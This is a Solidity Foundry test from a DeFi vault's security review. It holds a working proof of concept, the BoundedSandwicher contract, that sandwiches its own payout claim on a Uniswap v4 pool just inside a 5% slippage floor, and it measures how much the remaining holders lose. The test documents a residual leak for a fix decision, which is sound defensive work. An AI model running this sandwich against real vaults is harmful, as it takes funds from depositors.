// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Vm} from "forge-std/Vm.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

import {CoreVault} from "../../../src/core/CoreVault.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {ICoreVaultPayouts} from "../../../src/interfaces/ICoreVaultPayouts.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {V4SwapRouter} from "../../mocks/v4/V4SwapRouter.sol";
import {HubFundFixture} from "./HubFundFixture.sol";

/// @notice A Shareholder who sandwiches its own claim, but only pushes the pool a little under the external price:
///         far enough to be paid for it, not far enough to trip the unwind swap's floor.
contract BoundedSandwicher {
    CoreVault internal immutable core;
    V4SwapRouter internal immutable router;
    IERC20 internal immutable weth;
    IERC20 internal immutable usdc;
    PoolKey internal key;

    constructor(CoreVault core_, V4SwapRouter router_, IERC20 weth_, IERC20 usdc_, PoolKey memory key_) {
        core = core_;
        router = router_;
        weth = weth_;
        usdc = usdc_;
        key = key_;
        weth_.approve(address(router_), type(uint256).max);
        usdc_.approve(address(router_), type(uint256).max);
    }

    function deposit(uint256 amount) external {
        usdc.approve(address(core), amount);
        core.deposit(amount, 0);
    }

    function request(uint256 amount, ICoreVault.PayoutMode mode) external {
        core.requestPayout(amount, mode, 0);
    }

    function claim() external returns (ICoreVault.PayoutReceipt memory) {
        return core.claimPayout(0);
    }

    /// @param pushTo sqrtPriceX96 the WETH dump stops at (the exact-input swap stops at its price limit).
    /// @param restoreTo sqrtPriceX96 to buy the price back up to after the claim.
    function sandwichClaim(uint160 pushTo, uint160 restoreTo) external returns (ICoreVault.PayoutReceipt memory r) {
        router.swap(key, true, -int256(weth.balanceOf(address(this))), pushTo);
        r = core.claimPayout(0);
        router.swap(key, false, -int256(usdc.balanceOf(address(this))), restoreTo);
    }
}

/// @title Final verification of security review S-2: the residual leak inside the 5% floor
/// @notice S-2 (`SpokeVault._unwindSwap`) floors the automatic unwind's swap at the higher of the spot quote and the
///         price-source value, less `MAX_UNWIND_SLIPPAGE_BPS` (500). The fix stops the crash sandwich the PoC showed
///         (29% under the external price). It does not stop a sandwich that stays inside the floor: a claimant who
///         pushes the pool about 4% under the external price still makes the fund sell its WETH there, buys it back and
///         keeps the difference, which the holders who stay pay. The leak is bounded by the floor (5% of the amount
///         unwound) but it is real, repeatable (a Standard Payout carries no Payout Fee) and the parameter is OPEN
///         (QA3). This test pins the bound so the founder's ruling on `MAX_UNWIND_SLIPPAGE_BPS` has a number.
/// @dev Same fixture and sizes as `UnwindSpotSandwichTest`; the only difference is how far the attacker pushes.
contract UnwindFloorResidualTest is HubFundFixture {
    address internal victim = makeAddr("victim");
    BoundedSandwicher internal attacker;
    bytes32 internal positionKey;

    function setUp() public override {
        super.setUp();
        (int24 lo, int24 hi) = _rangeAround(5000);
        _provideExternalLiquidity(lo, hi, 2000e18, 5_000_000e6);

        attacker = new BoundedSandwicher(core, router, IERC20(address(weth)), IERC20(address(usdc)), key);
        _deposit(victim, 1_000_000e6);
        usdc.mint(address(attacker), 200_000e6);
        attacker.deposit(200_000e6);

        (int24 lower, int24 upper) = _rangeAround(1000);
        (positionKey,,) = _allocateAndOpen(core.freeIdle() * 95 / 100, lower, upper);
        _arbToExternalPrice();

        attacker.request(150_000e6, ICoreVaultPayouts.PayoutMode.Standard);
        vm.warp(block.timestamp + 72 hours);
    }

    function test_VF_S2_sandwichInsideTheFloorStillSellsTheFundsWethUnderTheExternalPrice() public {
        // Honest claim, for reference.
        uint256 snapshot = vm.snapshotState();
        attacker.claim();
        _arbToExternalPrice();
        uint256 victimHonest = _wealth(victim);
        uint256 attackerHonest = _wealth(address(attacker));
        vm.revertToState(snapshot);

        // The sandwich: push the pool to 96% of the external price (inside the 5% floor), claim, restore.
        uint256 flash = 1500e18;
        weth.mint(address(attacker), flash);
        uint160 pushTo = _sqrtPriceFor(WETH_PRICE * 96 / 100);

        vm.recordLogs();
        ICoreVault.PayoutReceipt memory r = attacker.sandwichClaim(pushTo, startSqrtPrice);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        (uint256 wethSold, uint256 usdcGot) = _unwindSwap(logs);
        _arbToExternalPrice();

        // The unwind ran: the fund sold WETH inside the claim, at the pushed price.
        assertGt(wethSold, 0, "the unwind swap executed");
        assertGt(r.unwindProceeds, 0, "the unwind produced proceeds");
        uint256 fair = _fair(wethSold);
        assertLt(usdcGot, fair * 97 / 100, "the fund sold at least 3% under the external price");
        assertGe(usdcGot, fair * 95 / 100, "and no lower than the floor allows");

        // The holders who stay pay for it, the claimant keeps it: a bounded but real transfer.
        uint256 victimLoss = victimHonest - _wealth(victim);
        uint256 attackerGain = _wealth(address(attacker)) - _fair(flash) - attackerHonest;
        emit log_named_uint("WETH sold by the unwind (wei)", wethSold);
        emit log_named_uint("USDC received", usdcGot);
        emit log_named_uint("fair value of that WETH", fair);
        emit log_named_uint("victim loss vs honest claim (USDC)", victimLoss);
        emit log_named_uint("attacker gain vs honest claim (USDC)", attackerGain);
        assertGt(victimLoss, 1000e6, "the victim loses more than 1,000 USDC to a sandwich the floor allows");
        assertGt(attackerGain, 1000e6, "the attacker keeps more than 1,000 USDC of it");
    }

    /// @dev The adapter's `Swapped(poolKey, tokenIn, tokenOut, amountIn, amountOut)` of the unwind swap.
    function _unwindSwap(Vm.Log[] memory logs) internal view returns (uint256 amountIn, uint256 amountOut) {
        bytes32 sig = IAdapter.Swapped.selector;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter != address(adapter) || logs[i].topics[0] != sig) continue;
            if (address(uint160(uint256(logs[i].topics[2]))) != address(weth)) continue;
            (amountIn, amountOut) = abi.decode(logs[i].data, (uint256, uint256));
        }
    }
}
